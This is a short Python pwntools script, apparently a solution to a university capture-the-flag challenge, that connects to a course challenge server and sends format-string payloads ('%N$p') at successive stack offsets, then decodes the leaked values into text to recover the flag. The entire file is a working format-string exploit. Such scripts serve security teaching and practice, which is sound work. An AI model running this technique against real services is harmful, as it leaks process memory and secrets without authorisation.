from pwn import *
logging.getLogger('pwnlib').setLevel(logging.WARNING)

hex_vals = []
for i in range(20):
    p = remote("cse4830-format-100.chals.io", 443, ssl=True, sni="cse4830-format-100.chals.io")
    p.sendline(b'%'+str(i).encode('utf-8')+b'$p')
    p.recvline()
    try:
        for i in p.recvline().decode('utf-8').split(' '):
            if '0x' in i:
                string = p64(int(i.strip('\n'),16))
                hex_vals.append(string.decode('utf-8'))

                    
    except:
        next
    p.close()

print(''.join(hex_vals))
